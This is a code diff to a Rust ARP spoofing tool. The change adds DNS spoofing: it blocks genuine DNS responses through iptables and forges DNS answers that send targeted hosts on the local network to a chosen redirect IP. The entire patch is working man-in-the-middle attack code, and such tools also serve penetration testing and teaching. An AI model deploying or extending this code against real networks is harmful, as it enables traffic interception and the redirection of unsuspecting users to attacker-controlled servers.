@@ -5,6 +5,7 @@ use std::thread;
 use std::time::{Duration, Instant};
 use std::net::{IpAddr, Ipv4Addr};
 
+use crate::dns_spoof::{self, DnsSpoofConfig};
 use crate::ip_forward::restore_ip_forwarding;
 
 #[derive(Clone)]
@@ -22,7 +23,7 @@ enum ArpOp {
     Reply,
 }
 
-pub fn start_arp_spoofing(interface_name: &str, target_ips: Vec<Ipv4Addr>, gateway_ip: Ipv4Addr) -> Result<(), Error> {
+pub fn start_arp_spoofing(interface_name: &str, target_ips: Vec<Ipv4Addr>, gateway_ip: Ipv4Addr, dns_config: Option<DnsSpoofConfig>) -> Result<(), Error> {
     let our_mac = get_interface_mac(interface_name)?;
     let our_ip = get_interface_ip(interface_name)?;
 
@@ -60,6 +61,16 @@ pub fn start_arp_spoofing(interface_name: &str, target_ips: Vec<Ipv4Addr>, gatew
         println!("    |- Gateway MAC: {}", mac_to_string(&target.gateway_mac));
     }
 
+    if let Some(ref dns) = dns_config {
+        println!("[*] DNS spoofing enabled");
+        println!("    |- Domain: {}", dns.domain);
+        println!("    |- Redirect to: {}", dns.redirect_ip);
+        println!("[*] Blocking forwarded DNS responses via iptables...");
+        dns_spoof::block_dns_responses().unwrap_or_else(|e| {
+            eprintln!("    |- Warning: Could not block DNS responses: {}", e);
+        });
+    }
+
     let cap_clone = Arc::clone(&cap);
     let targets_clone = target_list.clone();
 
@@ -70,6 +81,7 @@ pub fn start_arp_spoofing(interface_name: &str, target_ips: Vec<Ipv4Addr>, gatew
             restore_arp(&mut cap, target.ip, target.gateway_ip, target.mac, target.gateway_mac)
                 .unwrap_or_else(|e| println!("Failed to restore ARP: {}", e));
         }
+        dns_spoof::restore_dns_responses();
         let _ = restore_ip_forwarding();
         process::exit(0);
     }).expect("Error setting Ctrl+C handler");
@@ -84,11 +96,24 @@ pub fn start_arp_spoofing(interface_name: &str, target_ips: Vec<Ipv4Addr>, gatew
             }
         }
 
+        let target_ips: Vec<Ipv4Addr> = target_list.iter().map(|t| t.ip).collect();
+        let target_macs: Vec<[u8; 6]> = target_list.iter().map(|t| t.mac).collect();
+
         {
             let mut cap = cap.lock().unwrap();
             loop {
                 match cap.next_packet() {
-                    Ok(packet) => process_packet(&packet, &mut target_list),
+                    Ok(packet) => {
+                        process_packet(&packet, &mut target_list);
+                        if dns_config.is_some() {
+                            let data = packet.data.to_vec();
+                            drop(packet);
+                            let dns = dns_config.as_ref().unwrap();
+                            let _ = dns_spoof::process_dns_request(
+                                &mut cap, &data, dns, &target_ips, &target_macs
+                            );
+                        }
+                    }
                     Err(Error::TimeoutExpired) => break,
                     Err(e) => {
                         println!("Error reading packet: {}", e);
@@ -224,7 +249,7 @@ fn get_mac(cap: &mut Capture<pcap::Active>, iface: &str, ip: Ipv4Addr) -> Result
     Err(Error::TimeoutExpired)
 }
 
-fn get_interface_ip(interface: &str) -> Result<Ipv4Addr, std::io::Error> {
+pub fn get_interface_ip(interface: &str) -> Result<Ipv4Addr, std::io::Error> {
     let interfaces = pcap::Device::list().unwrap();
     let device = interfaces.into_iter()
         .find(|dev| dev.name == interface)
@@ -244,7 +269,7 @@ fn get_interface_ip(interface: &str) -> Result<Ipv4Addr, std::io::Error> {
     Ok(addr)
 }
 
-fn get_interface_mac(interface: &str) -> Result<[u8; 6], std::io::Error> {
+pub fn get_interface_mac(interface: &str) -> Result<[u8; 6], std::io::Error> {
     let path = format!("/sys/class/net/{}/address", interface);
     let mac_str = std::fs::read_to_string(path)?;
     let mut bytes = [0u8; 6];
